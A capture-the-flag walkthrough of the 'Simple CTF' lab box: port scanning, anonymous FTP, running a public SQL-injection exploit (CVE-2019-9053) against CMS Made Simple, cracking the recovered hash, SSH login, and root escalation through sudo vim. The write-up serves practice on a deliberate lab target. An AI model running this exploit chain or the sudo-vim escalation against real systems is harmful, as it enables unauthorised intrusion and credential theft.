# Simple CTF

```sh
export IP=10.10.70.219
```

## nmap

```sh
map -p- -Pn -A -T5 $IP
```

```
Starting Nmap 7.80 ( https://nmap.org ) at 2023-04-04 16:12 WEST
Nmap scan report for 10.10.70.219
Host is up (0.075s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.18.10.39
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status

80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works

2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)

Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

## ftp 21

Version: vsftpd 3.0.3

- Anonymous FTP login allowed
- Control connection is plain text (ASCII)

Anonymous login: 

```sh
ftp anonymous@$IP
```

```
Connected to 10.10.70.219.
220 (vsFTPd 3.0.3)
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
ftp> cd /home
550 Failed to change directory.
ftp> cd /var/www/html
550 Failed to change directory.
```

ConnectorException: Error getting FTP files: Error from FTP Server, 550 Failed to change directory.

This error means the specified remote directory does not exist.

However it is important to understand how this value should be configured.

```
ftp> ls
229 Entering Extended Passive Mode (|||43236|)
...
```

Code 229: [Extended Passive Mode](https://www.ibm.com/docs/en/zos/2.2.0?topic=codes-229-entering-extended-passive-mode-port-number)

Connected with nc: `nc $IP 43236`

```
...
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 17  2019 pub
226 Directory send OK.
...
```

## http 80

Apache 2.4.18 (Ubuntu)

<details>
  <summary>robots.txt</summary>

  ```
  #
  # "$Id: robots.txt 3494 2003-03-19 15:37:44Z mike $"
  #
  #   This file tells search engines not to index your CUPS server.
  #
  #   Copyright 1993-2003 by Easy Software Products.
  #
  #   These coded instructions, statements, and computer programs are the
  #   property of Easy Software Products and are protected by Federal
  #   copyright law.  Distribution and use rights are outlined in the file
  #   "LICENSE.txt" which should have been included with this file.  If this
  #   file is missing or damaged please contact Easy Software Products
  #   at:
  #
  #       Attn: CUPS Licensing Information
  #       Easy Software Products
  #       44141 Airport View Drive, Suite 204
  #       Hollywood, Maryland 20636-3111 USA
  #
  #       Voice: (301) 373-9600
  #       EMail: cups-info@cups.org
  #         WWW: http://www.cups.org
  #

  User-agent: *
  Disallow: /


  Disallow: /openemr-5_0_1_3 
  #
  # End of "$Id: robots.txt 3494 2003-03-19 15:37:44Z mike $".
  #
  ```
  
  https://www.google.com/search?q=openemr-5_0_1_3

</details>

## ssh 2222

[Search OpenSSH 7.2p2 CVEs](https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=OpenSSH+7.2p2) (2 entries)

<details>
  <summary>Spoiler: password</summary>

  `secret`

</details>

### Exploit

Found /simple with gobuster. This site is powered by CMS Made Simple version 2.2.8

[Search CMS Made Simple CVEs](https://www.exploit-db.com/search?q=CMS+made+simple) (34 entries)
- SQL injection vulnerability [CVE-2019-9053](https://www.exploit-db.com/exploits/46635)

Downloaded [46635.py](46635.py) from exploit-db.com

```sh
sudo apt install python2 python-pip
python2 -m pip install requests termcolor
python2 46635.py -u http://$IP/simple
```

```
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: 9
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
```

Time to crack the salted hash with [hashcat](https://hashcat.net/hashcat/)

```sh
hashcat -O -a 0 -m 20 0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2 ~/wordlists/rockyou.txt
```

```
0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2:secret
```

```sh
ssh -p 2222 mitch@$IP
$ cat user.txt	
G00d j0b, keep up!
$ /bin/bash
mitch@Machine:/$ cd /home
mitch@Machine:/home$ ll
total 16
drwxr-xr-x  4 root    root    4096 aug 17  2019 ./
drwxr-xr-x 23 root    root    4096 aug 19  2019 ../
drwxr-x---  3 mitch   mitch   4096 aug 19  2019 mitch/
drwxr-x--- 16 sunbath sunbath 4096 aug 19  2019 sunbath/
```

```bash
mitch@Machine:/home$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
```

[GTFOBins Vim](https://gtfobins.github.io/gtfobins/vim/)

```sh
tch@Machine:/home$ sudo vim -c ':!/bin/bash'
root@Machine:~# cat /root/root.txt
W3ll d0n3. You made it!
```
